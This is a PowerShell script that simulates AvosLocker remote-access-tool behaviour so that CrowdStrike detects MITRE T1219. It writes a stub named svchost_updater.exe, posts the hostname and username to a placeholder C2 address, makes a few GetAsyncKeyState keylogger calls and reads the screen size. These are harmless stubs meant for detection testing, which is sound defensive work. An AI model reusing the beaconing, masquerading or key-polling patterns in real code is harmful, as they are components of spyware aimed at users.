<#
.SYNOPSIS
    AvosLocker RAT Installation Simulation - DETECTION TRIGGER
.DESCRIPTION
    Simulates remote access tool behavior.
    Will trigger EDR detection for T1219.
    TTP: T1219
.PARAMETER C2URL
    Command and control URL
#>
param(
    [Parameter(Mandatory=$false)]
    [string]$C2URL = "http://10.0.0.1:443/beacon"
)

Write-Host "[*] Starting AvosLocker RAT Simulation (T1219)" -ForegroundColor Cyan
Write-Host "[*] C2 URL: $C2URL" -ForegroundColor Yellow
Write-Host "[*] This will trigger EDR detection for remote access tool" -ForegroundColor Yellow

try {
    # ACTUAL DETECTION TRIGGER - RAT-like behavior patterns
    
    # 1. Create a persistence location (typical RAT behavior)
    $ratPath = "$env:APPDATA\RTL_RAT_Test"
    New-Item -Path $ratPath -ItemType Directory -Force | Out-Null
    
    # 2. Create a stub executable (triggers file creation in persistence location)
    $stubContent = "This is a test file simulating a RAT executable"
    $stubContent | Out-File "$ratPath\svchost_updater.exe" -Force
    Write-Host "[*] Created stub in persistence location"
    
    # 3. Attempt C2 beacon (typical RAT check-in behavior)
    Write-Host "[*] Attempting C2 beacon to: $C2URL"
    
    try {
        $beaconData = @{
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            timestamp = (Get-Date).ToString()
            command = "checkin"
        } | ConvertTo-Json
        
        Invoke-WebRequest -Uri $C2URL -Method POST -Body $beaconData -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
        Write-Host "[+] C2 beacon sent" -ForegroundColor Green
    } catch {
        Write-Host "[-] C2 beacon failed (expected if no C2 server)" -ForegroundColor Yellow
    }
    
    # 4. Keylogger-like behavior (GetAsyncKeyState calls)
    Write-Host "[*] Simulating keylogger behavior..."
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
    # Just call it a few times to trigger detection
    1..5 | ForEach-Object { [KeyLogger]::GetAsyncKeyState(0x41) | Out-Null }
    Write-Host "[*] GetAsyncKeyState calls made"
    
    # 5. Screenshot simulation (another RAT behavior)
    Write-Host "[*] Simulating screenshot capability..."
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    Write-Host "[*] Screen dimensions: $($screen.Width)x$($screen.Height)"
    
    # Cleanup
    Remove-Item $ratPath -Recurse -Force -ErrorAction SilentlyContinue
    
    Write-Host "[+] SUCCESS: RAT simulation completed" -ForegroundColor Green
    Write-Host "[!] CrowdStrike should detect: 'RemoteAccessTool' or 'C2Communication'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
